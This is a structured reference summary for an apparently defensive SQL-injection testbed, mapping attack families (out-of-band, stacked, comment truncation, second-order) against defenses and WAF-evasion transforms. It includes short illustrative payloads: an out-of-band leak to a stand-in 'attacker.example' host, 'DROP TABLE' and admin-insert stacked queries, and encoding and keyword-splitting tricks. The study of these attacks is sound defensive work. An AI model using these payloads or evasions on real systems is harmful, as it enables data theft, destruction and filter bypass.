# SQL Injection — Attacks, Defenses & Evasion (Summary)

A condensed, cross-referenced summary of `docs/sqli-reference.pdf`
("SQL Injections: Attacks, Defenses and Evasion — A Working Reference for
Exemplar Selection"). It restructures the reference around one question:

> for each **attack**, which **defenses** stop it, and which **evasion
> techniques** (if any) let the attack slip past those defenses?

The payload snippets are short, generic illustrations (as in the source),
not engine-specific syntax. This lab is a defensive testbed — the point is to
see which defense catches which attack and where the blind spots are.

---

## 1. Attacks (core families)

The four families are defined by properties of the **attack itself** —
independent of any defense — namely how stolen data travels back, how the
payload is shaped, and *when* it runs relative to when it was submitted. A real
attack may combine several.

### A1. Out-of-band (OOB)
The attacker sees nothing useful in the reply (no results, no error, not even a
timing difference). Instead of reading data back, they make the **database
itself reach out** across the network to a server they control, hiding a stolen
value inside the address of that outbound request. The usual channels are DNS
and HTTP:

```
(SELECT current_user) || '.attacker.example'   ->  DNS lookup for admin.attacker.example
http://attacker.example/?d=(secret)            ->  value leaked in the URL
```

The DB becomes a courier; the attacker reads the secret from their own
DNS/HTTP logs.

### A2. Piggy-backed / stacked queries
SQL allows several statements in one string, separated by `;`. If the app hands
input to a driver that permits multiple statements, the attacker closes the
intended statement and appends their own, which run with the app's privileges —
turning a read-only page into a tool for writes, deletes, or account creation.

```
'; DROP TABLE sessions; --
'; INSERT INTO users(name,role) VALUES('x','admin'); --
```

### A3. Comment-based / query truncation
Every dialect has a comment marker (`--` or `#`) that makes the engine ignore
the rest of the line. The attacker injects it to **delete the tail** of the
original query — a password check, or a trailing quote/paren that would
otherwise break the payload. It removes constraints rather than adding them.

```
SELECT * FROM users WHERE user = 'admin'-- ' AND pass = '...'   (password half commented out)
```

### A4. Second-order (stored)
The most important for detection work, because it defeats the two defenses
teams rely on most. The value does **nothing when first submitted** — it is
accepted and stored (often parameterized perfectly correctly on the way in), so
every front-door check passes. The harm comes **later**, in a separate request,
when some other code reads the stored value back and pastes it into a new query
as text. Injection and effect are pulled apart in time, across code paths, and
often across privilege levels.

```
Step 1 (sign-up, stored safely):   username = admin'--
Step 2 (days later, admin report): "SELECT * FROM audit WHERE created_by = '" + storedUsername + "'"
```

Critically, in the request where the payload fires, there is **no
attacker-supplied input present at all** to inspect — the dangerous data came
from the trusted database.

---

## 2. Defenses

Three roles: **prevention** (stop the input ever being read as code),
**containment** (limit damage once an injection succeeds), **detection** (watch
traffic/execution and block what looks malicious).

### D1. Parameterized queries / prepared statements — *prevention* (primary)
The query is sent as a fixed template with a placeholder (`... WHERE name = ?`);
the DB parses and compiles it **before** it sees any input, freezing the query
shape. The value is then slotted in as pure data and can never be re-read as
SQL. (Java `PreparedStatement`, PHP PDO, most ORMs.)
**Limitation:** binds **values only** — it cannot fill structural parts (table
name, column name, `ORDER BY` target), so an app can be "100% parameterized"
and still vulnerable where those are built by string-pasting.

### D2. Input validation + canonicalization — *prevention*
First **canonicalize** (decode/normalize to one standard form so `%27` becomes a
real quote the validator can see), then **validate**: an **allow-list** (strong
— "an order ID is 1–8 digits, nothing else") rejects anything off-shape; a
**deny-list** (weak) tries to spot known-bad fragments.
**Limitation:** deny-lists can never enumerate every spelling; if the
canonicalizer decodes differently than the DB driver later will, something safe
at check time goes live at the DB; blind to second-order (valid on arrival).

### D3. Web Application Firewall (WAF) — *detection*
Sits in front of the app; reads the raw HTTP request (URL, params, headers) and
matches the bytes against a library of **signatures** (regexes like
`union\s+select`). (OWASP Core Rule Set on Coraza / ModSecurity.)
**Limitation:** only ever sees the request **as text on the wire** — never the
final SQL. Disguise the payload (re-encode, break up keywords) so the literal
pattern is absent but the app/DB still reconstitute the attack, and it passes.
Essentially every evasion technique targets this blind spot.

### D4. Runtime protection / RASP — *detection*
Moves inspection **inside** the running app, next to where queries execute
(`db.execute(finalQuery)`). By that point all encoding is undone, so RASP sees
the **real final query** and (in good implementations) the structure the
developer intended; if a value-only parameter has added query structure, it
blocks the call. Much harder to fool with encoding than a WAF. (OpenRASP.)
**Limitation:** only protects **instrumented** calls and reasons about **one
request at a time** — so second-order (planted in an earlier request) and OOB
leaks (never touch the normal response) can slip past; adds runtime overhead.

### D5. Database-side containment — *containment*
Settings of the DB itself that **limit damage** once an injection succeeds.
Chiefly **least privilege** (grant the app account only what it needs — no
`DROP`, no other databases, no file/network functions), plus **disabling
multiple statements** in the driver and **suppressing detailed error messages**.
**Limitation:** shrinks the blast radius but does not stop the injection — an
attacker can still read/change anything the account is allowed to touch.

### D6. Network egress control — *containment*
A firewall rule forbidding the DB server from making **outbound** connections
(no DNS, no outbound HTTP), enforced with host firewalls (nftables) or cloud
security groups. Closes the OOB channel specifically: if the DB can't phone out,
it can't act as a courier.
**Limitation:** addresses only OOB; does nothing against in-band or blind
attacks, which never need the DB to phone out.

---

## 3. Evasion techniques

Not new payloads — **transforms layered on top of a core-family payload** so a
*specific* defense sees something harmless while the DB still runs the real
thing. Each is tagged with the defense it beats (used as cell contents in the
matrix below).

| Tag | Technique | How it works | Primarily evades |
|-----|-----------|--------------|------------------|
| **ENC** | Alternate / double encoding | Payload written encoded so one layer leaves it alone but a later layer decodes it back (`%55NION` → `UNION`; `%2555` survives one decode). | WAF (and validation, if the canonicalizer and DB driver disagree) |
| **SPL** | Token splitting via comments | Inline comments inside a keyword (`UN/**/ION`); the signature never sees the whole word, but the SQL parser discards the comment and rejoins it. | WAF / signature filters |
| **CASE** | Case / whitespace mutation | Re-case keywords and use odd whitespace (`uNiOn`⟨tab⟩`sElEcT`); SQL is case-insensitive and whitespace-tolerant, so meaning is unchanged. | Naive literal / regex signatures (WAF) |
| **EQV** | Logical / syntactic equivalents | Swap a blocked construct for one that means the same (`OR 1=1` → `OR 'a'='a'` → `OR 2>1`); unlimited equivalents. | Deny-list filters |
| **DYN** | Dynamic keyword construction | Keyword isn't written at all — assembled at run time (`CONCAT('SEL','ECT')`, `CHAR()` codes), so it exists only after the DB evaluates it. | WAF / signature filters (strongest case — nothing to match) |
| **HPF** | HTTP parameter fragmentation / pollution | One payload split across several params, or the same param sent twice; the server/app rejoins the pieces. Each fragment is valid alone. | Entry-point input validation |
| **CSET** | Charset / encoding confusion | The escaper assumes one character set, the DB uses another; a crafted multibyte sequence "swallows" the added backslash, re-exposing the quote. | Escaping / sanitization |
| **STRUCT** | Injection into non-parameterizable positions | Aim at a spot a prepared statement can't protect — column/table name, `ORDER BY` target — which the app builds by pasting text. | Parameterized queries |
| **SO** | Second-order (cross-listed) | Stored cleanly in one request, becomes an injection only when a later request reads it back. The time/code-path gap is itself the evasion. | Entry-point validation (+ parameterization + RASP's one-request model) |

---

## 4. The matrix — attack × defense, evasion in the cells

Rows are attacks, columns are defenses. Each cell says whether the defense
stops that attack, and — if the defense would otherwise apply — which evasion
transform(s) let the attack slip past it.

**Effectiveness:** ✅ counters it · 🟡 partial / damage-limiting only · ⬜ blind
(defense never sees or stops this attack).

| Attack ↓ \ Defense → | D1 Param. queries | D2 Input validation | D3 WAF | D4 RASP | D5 DB containment | D6 Egress control |
|---|---|---|---|---|---|---|
| **A1 Out-of-band** | ✅ *(if value)* — bypass **STRUCT** | ✅ — bypass **ENC, HPF** | 🟡 — bypass **ENC, SPL, CASE, DYN, HPF** | 🟡 *(sees the call; OOB leak is a listed gap)* | ✅ **least-priv** blocks net/file funcs | ✅✅ **decisive** — kills the channel |
| **A2 Stacked queries** | ✅ — bypass **STRUCT** | ✅ — bypass **ENC, EQV, HPF** | ✅ — bypass **ENC, SPL, CASE, DYN, HPF** | ✅ *(sees the extra statement)* | ✅✅ **disable multi-stmt** (decisive) + least-priv | ⬜ *(n/a unless the payload is OOB)* |
| **A3 Comment / truncation** | ✅ — bypass **STRUCT** | ✅ — bypass **ENC, EQV, HPF** | ✅ — bypass **ENC, SPL, CASE** | ✅ *(sees the truncated structure)* | 🟡 least-priv limits damage; doesn't stop auth-bypass | ⬜ |
| **A4 Second-order** | ⬜ **SO** *(write ok; later read re-concatenates)* | ⬜ **SO** *(valid on arrival)* | ⬜ **SO** *(planted earlier; no signature at fire)* | ⬜ **SO** *(one-request; no input at fire)* | 🟡 least-priv limits damage once it fires | ⬜ *(n/a unless the payload is OOB)* |

---

## 5. How to read it — the asymmetries

The grid is useful precisely because it is **not** a clean one-to-one pairing.
Five things to notice:

1. **Evasions pair with *defenses*, not attacks.** ENC/SPL/CASE/EQV/DYN are
   attack-agnostic *wrappers* — you can wrap almost any flaggable payload in any
   of them. Their job is to beat one specific defense, almost always the **WAF**
   or a **deny-list validator** (note how those two columns hold nearly all the
   evasion tags). So "which evasion goes with stacked queries?" has no single
   answer — all the keyword-hiders do.

2. **Only two defenses are attack-specific (the clean 1:1 pairs):**
   **OOB ↔ egress control (D6)** and **stacked queries ↔ disable-multi-statements
   (part of D5)**. Everything else (D1–D4) is many-to-one: each counters all
   three first-order attacks, so it isn't "paired" with any one of them.

3. **Second-order is the under-defended attack.** Its whole row across the
   detection/prevention defenses is ⬜ — it is designed to walk past validation,
   parameterization, *and* RASP. The only thing that touches it here is **D5
   least-privilege**, which merely limits the damage once it fires. The real
   counters (parameterize the *later read* too; treat all DB-sourced data as
   untrusted) aren't named defenses in the source.

4. **Two evasions are outliers that don't target the WAF.** **STRUCT** targets
   **D1 parameterized queries** — the *primary prevention*, not a detection
   layer — by aiming at a structural position placeholders can't bind.
   **CSET** targets **escaping/sanitization**, which isn't even one of the six
   main defenses (it's the older alternative to parameterization).

5. **Some defenses have no evasion transform against them** — **RASP (D4)**,
   **egress control (D6)**, **least-privilege (D5)**. That's deliberate: the
   encoding tricks *can't* beat RASP (it sees the decoded final query — that's
   its entire value proposition). What defeats RASP isn't an evasion transform
   but a different *attack family* (**SO** or **OOB**). Likewise nothing
   "evades" egress control; you simply switch to an in-band/blind attack that
   never needs the channel.

**Mental model:** don't think of it as a filled grid. Think of **attacks** on
one axis and **defenses** on another, with **evasions as arrows from a payload
to a specific defense's blind spot** — and those arrows cluster almost entirely
on the two text-inspection defenses (WAF + deny-list validation).

---

*Summary of `docs/sqli-reference.pdf`. For the live lab topology and how to
reproduce these against the testbed, see `docs/RUNBOOK.md` and
`docs/TUTORIAL.md`.*
